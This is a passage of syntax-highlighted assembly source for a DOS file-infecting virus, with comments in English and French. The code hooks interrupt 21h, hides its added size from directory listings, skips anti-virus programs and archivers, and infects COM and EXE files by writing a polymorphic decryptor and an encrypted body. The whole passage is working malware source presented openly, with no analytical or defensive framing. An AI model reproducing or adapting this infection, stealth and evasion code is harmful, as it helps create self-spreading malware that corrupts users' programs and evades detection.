</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5555h</span><span class="sc0">                   </span><span class="sc1">;avoid flag L</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1E55h</span><span class="sc0">                   </span><span class="sc1">;program execution?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite</span><span class="sc0">                       </span><span class="sc1">;no =&gt; continue</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5555h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infecte</span><span class="sc0">                     </span><span class="sc1">;yes =&gt; infect program</span><span class="sc0">
</span><span class="sc5">suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5555h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6969h</span><span class="sc0">                   </span><span class="sc1">;residency test?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">              </span><span class="sc1">;no =&gt; let's continue with old int</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">;yes =&gt; put 6969h in bx</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">;and return to program</span><span class="sc0">

</span><span class="sc1">;***************** old interruption 21 *************************</span><span class="sc0">

</span><span class="sc5">vieille_int_21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                         </span><span class="sc1">;EAh=JMP FAR</span><span class="sc0">
</span><span class="sc5">ip_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;offset old int</span><span class="sc0">
</span><span class="sc5">cs_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;segment old int</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;****************** directory stealth ********************************</span><span class="sc0">

</span><span class="sc5">dir_stealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">;simulation of an int 21h, so push flags</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;and segment</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">     </span><span class="sc1">;call old int 21h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;if al=0 all is OK</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_fcb</span><span class="sc0">            </span><span class="sc1">;if al&lt;&gt;0 stop stealth</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5100h</span><span class="sc0">              </span><span class="sc1">;get current psp </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;return segment psp in bx, offset in dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;now es = segment psp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;come from DOS?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">           </span><span class="sc1">;no =&gt; stop stealth</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;bx= psp offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;extended fcb?</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;save marker of extended fcb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2F00h</span><span class="sc0">              </span><span class="sc1">;get current dta </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;return in es:bx dta position</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;get back fcb marker</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;FFh+1=0, so if extended z=0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_fix</span><span class="sc0">              </span><span class="sc1">;no extended</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">               </span><span class="sc1">;extended: offset is 7 bytes more</span><span class="sc0">
</span><span class="sc5">no_fix</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;time in al</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">       </span><span class="sc1">;just look at seconds</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">       </span><span class="sc1">;seconds = 30?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">           </span><span class="sc1">;no =&gt; stop stealth</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;prog&lt;65000?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">soustraction</span><span class="sc0">                                        </span><span class="sc1">;no =&gt; stealth it</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">      </span><span class="sc1">;prog&lt;virus size+500?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">                                            </span><span class="sc1">;yes =&gt; no stealth</span><span class="sc0">
</span><span class="sc5">soustraction</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">          </span><span class="sc1">;substract virus size</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_fcb2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">exit_fcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;********************* INFECTION ***************************************</span><span class="sc0">

</span><span class="sc5">infecte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;---- 1) do not infect an anti-virus</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;ds:dx = offset program name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_liste</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">     </span><span class="sc1">;in di, offset AV list</span><span class="sc0">

</span><span class="sc5">cherche_extension</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;find extension</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cherche_extension</span><span class="sc0">

</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;put extension in memory</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">cherche_debut</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;find start of program name</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cherche_debut</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">         </span><span class="sc1">;put segment/offset of program name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">;in memory</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;scasw uses es:di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;so exchange segments </span><span class="sc0">
                    
</span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;get 2 first letters</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;12 AV names to compare + COMMAND.COM</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                     </span><span class="sc1">;compare</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">av_ok</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">redonne_la_main</span><span class="sc0">             </span><span class="sc1">;it's an AV =&gt; do not infect</span><span class="sc0">
</span><span class="sc5">av_ok</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;switch to zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                               </span><span class="sc1">;5 archivers</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                                             </span><span class="sc1">;test names</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">zip_ok</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">;it's an archiver</span><span class="sc0">
</span><span class="sc5">zip_ok</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----- 2) open file and read header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;file name in</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ds:dx for attribs</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                                      </span><span class="sc1">;get attribs in al</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_attrib</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">;attribs in memory</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                                      </span><span class="sc1">;attribs to zero</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03d02h</span><span class="sc0">                                  </span><span class="sc1">;open file in read/write</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">redonne_la_main_attributs</span><span class="sc0">                   </span><span class="sc1">;problem? do not infect</span><span class="sc0">

</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                     </span><span class="sc1">;handle in bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                         </span><span class="sc1">;all segments point</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                         </span><span class="sc1">;to virus code</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">                                      </span><span class="sc1">;get time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                 </span><span class="sc1">;in memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_date</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">                                   </span><span class="sc1">;read file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">                                     </span><span class="sc1">;1Ch first bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">              </span><span class="sc1">;in their buffer</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;---- 3) is it an exe or a com?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"XE"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">compare_suite</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">compare_suite</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infecte_exe</span><span class="sc0">

</span><span class="sc5">compare_suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"OC"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_bonne_ext</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infecte_com</span><span class="sc0">

</span><span class="sc5">pas_bonne_ext</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">

</span><span class="sc1">;---- 4) COM infection</span><span class="sc0">

</span><span class="sc5">infecte_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">    </span><span class="sc1">;already infected?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pas_bonne_ext</span><span class="sc0">                                </span><span class="sc1">;yes =&gt; do not infect</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;transfert 4 bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;from buffer to new location</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                                   </span><span class="sc1">;pointer at the end of file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;return size in ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56000</span><span class="sc0">                                   </span><span class="sc1">;no infection if</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">verif_trop_petit</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">     </span><span class="sc1">;.com is &gt; 56000</span><span class="sc0">
</span><span class="sc5">verif_trop_petit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ecriture_com</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">     </span><span class="sc1">;or &lt; 500</span><span class="sc0">

</span><span class="sc5">ecriture_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                       </span><span class="sc1">;size-3 (cause JMP at start)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;save corrected size</span><span class="sc0">

</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_DEPUIS_RESIDENT</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;write decryptor</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;write encrypted body</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
